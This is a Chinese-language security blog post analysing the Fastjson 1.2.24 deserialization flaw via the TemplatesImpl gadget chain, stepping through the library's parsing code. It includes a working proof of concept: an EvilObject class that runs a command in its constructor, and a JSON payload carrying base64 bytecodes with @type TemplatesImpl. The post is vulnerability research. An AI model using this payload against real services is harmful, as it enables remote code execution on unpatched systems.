+++
title = "Fastjson 1.2.24 TemplatesImpl利用链"
publishDate = 2021-04-12T00:00:00+08:00
tags = ["fastjson", "java"]
draft = false
+++

Fastjson 是 alibaba 的一款开源 JSON 解析库，可以将 Java 对象和 JSON 字符串相互转化，并提供了 autotype 机制让使用者可以解析任意 Java 对象，导致一些存在利用点的类被用来进行反序列化攻击。
<!--more-->


## TemplatesImpl 利用链 {#templatesimpl-利用链}

这个类存在利用点的方法是 getTransletInstance，关键的代码如下：

```java
if (_name == null) return null;

if (_class == null) defineTransletClasses();

// The translet needs to keep a reference to all its auxiliary
// class to prevent the GC from collecting them
AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
...
```

首先是 `_name` 变量不能为空，不然直接返回 null。

这里的 `_class` 数组用来保存辅助类，避免垃圾收集器将它们销毁，并通过 newInstance 方法将主类初始化赋值给 translet 变量。前面判断当 `_class` 数组为空时会执行
defineTransletClasses 方法，我们跟进分析一下。

{{< figure src="/ox-hugo/2021-04-11_13-55-39_screenshot.png" >}}

这个方法主要是将 `_bytecodes` 的字节码提取出来，并调用 `loader.defineClass` 方法生成各个辅助类的 Class 对象保存到 `_class` 数组中。注意上图的两个红框部分——在创建 loader
时需要调用 `_tfactory` 私有变量中的方法，如果变量是空的话会报错，所以构造 poc 时需要随便设一个初始值；为了将当前的类设为主类使它初始化，需要这个类继承
AbstractTranslet 类。

综上我们可以构造一个 AbstractTranslet 的子类保存到 `_bytecodes` 中，在它的构造方法写入命令，当这个恶意类被初始化时命令就会执行。

```java
public class EvilObject extends AbstractTranslet {
    public EvilObject() throws IOException {
        Runtime.getRuntime().exec("calc.exe");
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
```

为了调用 getTransletInstance 方法，我们需要从 getOutputProperties 方法进入，它是私有变量 `_outputProperties` 的 getter 方法，会在 Fastjson 反序列化的过程中执行。调用栈如下：

{{< figure src="/ox-hugo/2021-04-11_15-01-58_screenshot.png" >}}


## Fastjson 解析过程 {#fastjson-解析过程}

通过下面的示例代码，构造恶意 TemplatesImpl 类的 JSON 字符串，调用 JSON#parse 方法进行反序列化：

```java
public class TemplatesImplPoc {
    public static String getBytecodes(String classPath) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        Files.copy(Paths.get(classPath), out);
        return Base64.getEncoder().encodeToString(out.toByteArray());
    }

    public static void main(String[] args) throws Exception {
        final String evilClassPath = System.getProperty("user.dir") + "\\target\\classes\\EvilObject.class";
        String evilCode = getBytecodes(evilClassPath);
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String poc = "{\"@type\":\"" + NASTY_CLASS + "\",\"_bytecodes\":[\"" + evilCode + "\"],'_name':'a.b','_tfactory':{},\"_outputProperties\":{}}";
        JSON.parse(poc, Feature.SupportNonPublicField);
    }
}
```

首先编译恶意类得到 class 文件，读取文件内容并且 base64 编码后写到 `_bytecodes` 数组中，
`@type` 指定反序列化 json 字符串的目标类型。然后初始化了一些属性，这些属性的作用在前面有解释，由于要设置私有属性，反序列化时需要开启 SupportNonPublicField 选项才能利用成功。

一直跟进到 DefaultJSONParser#parseObject 方法，创建 DefaultJSONParser 对象时初始化了
ParserConfig、JSONScanner 等重要类的实例。

{{< figure src="/ox-hugo/2021-04-11_23-57-31_screenshot.png" >}}

Fastjson 1.2.24 还没有引入 checkAutotype 安全机制，黑名单中只要两个线程类。

识别到 `@type` 关键字后，会从值中读取类名并获取 Class 对象，然后调用
ParserConfig#getDeserializer 方法获取解析器。

{{< figure src="/ox-hugo/2021-04-12_00-09-51_screenshot.png" >}}

在 getDeserializer 方法中对类名进行一些检查，看看是否在 denyList 中，或者是不是一些特殊的类。

{{< figure src="/ox-hugo/2021-04-12_00-15-10_screenshot.png" >}}

如果一直找不到解析器，就会执行 createJavaBeanDeserializer 方法创建。跟进到
JavaBeanInfo#build 方法：

{{< figure src="/ox-hugo/2021-04-12_01-11-59_screenshot.png" >}}

通过反射获取 TemplatesImpl 类的公共属性、方法和构造器，然后遍历公共方法将 setter 和对应的属性信息添加到 fieldList 中。

{{< figure src="/ox-hugo/2021-04-12_01-33-44_screenshot.png" >}}

在方法最后又对 methods 进行了一次遍历，这次将关键的 getOutputProperties 方法添加到
fieldList 中。

{{< figure src="/ox-hugo/2021-04-12_01-42-44_screenshot.png" >}}

可以看到方法需要满足一些条件，首先是 if 语句中条件：

```java
// 1.方法名长度大于4
methodName.length() >= 4 &&
// 2.不能是静态方法
!Modifier.isStatic(method.getModifiers()) &&
// 3.以get开头
methodName.startsWith("get") &&
// 4.第四个字符是大写
Character.isUpperCase(methodName.charAt(3)) &&
// 5.不能有参数
method.getParameterTypes().length == 0 &&
// 6.返回值继承于Collection||Map||AtomicBoolean||AtomicInteger||AtomicLong
(Collection.class.isAssignableFrom(method.getReturnType()) ||
 Map.class.isAssignableFrom(method.getReturnType()) ||
 AtomicBoolean.class == method.getReturnType() ||
 AtomicInteger.class == method.getReturnType() ||
 AtomicLong.class == method.getReturnType())
```

然后是属性不能在 fieldList 中，也就是刚刚添加 setter 时没有该属性的 setter。

最后返回解析器并执行它的 deserialze 方法，解析器的 sortedFieldDeserializers 属性封装了 getOutputProperties 方法。

{{< figure src="/ox-hugo/2021-04-12_03-12-20_screenshot.png" >}}

依次处理完 bytecodes、name 和 tfactory 三个属性后开始处理 outputProperties，我们跟进到 JavaBeanDeserializer#parseField 方法，该方法获取属性的解析器对其进行处理。

{{< figure src="/ox-hugo/2021-04-12_02-57-52_screenshot.png" >}}

从上图看到通过 smartMatch 方法获取 outputProperties 属性的解析器，但是参数前面是带有下划线的(之前三个属性也是)。不过 smartMatch 方法会将参数中的 `-` 和 `_` 忽略：

{{< figure src="/ox-hugo/2021-04-12_03-02-20_screenshot.png" >}}

然后跟进到 FieldDeserializer#setValue 方法，在为参数(outputProperties)赋值时从
fieldInfo 获取对应的 method 并调用 invoke 方法执行。

{{< figure src="/ox-hugo/2021-04-12_03-18-34_screenshot.png" >}}

就这样 Fastjson 的反序列化过程和 TemplatesImpl 的利用链成功适配，导致命令执行。

我们再回过头看看 bytecodes 参数的解析过程，Fastjson 根据属性的类型(字节数组)获取对应的解析器 ObjectArrayCodec，读取其内容时调用 JSONScanner#bytesValue 方法进行 base64
解码：

{{< figure src="/ox-hugo/2021-04-12_15-04-21_screenshot.png" >}}

```java
public byte[] bytesValue() {
    return IOUtils.decodeBase64(this.text, this.np + 1, this.sp);
}
```

所以 poc 中 bytecodes 的值要进行编码处理。


## 总结 {#总结}

Fastjson 1.2.24 中 autotype 是默认开启的，而且没有 checkAutotype 方法，所以攻击难度相对较低，在 1.2.25 后基本是针对 checkAutotype 的各种绕过了。但
TemplatesImpl 利用链中需要设置一些私有属性，需要 Fastjson 开启
SupportNonPublicField 选项，而这个选项是在 1.2.22 版本引入的。

Fastjson 还提供了几个 parseObject 方法来解析 JSON 字符串，不过最后和本文的示例一样都会执行到 DefaultJSONParser#parse，不影响 TemplatesImpl 利用链。

Fastjson 解析 JSON 字符串时，会调用反序列化对象的公共 setter 和构造函数，还有符合一定条件的 getter，TemplatesImpl 利用链就是用到了 getter 方法中的漏洞。
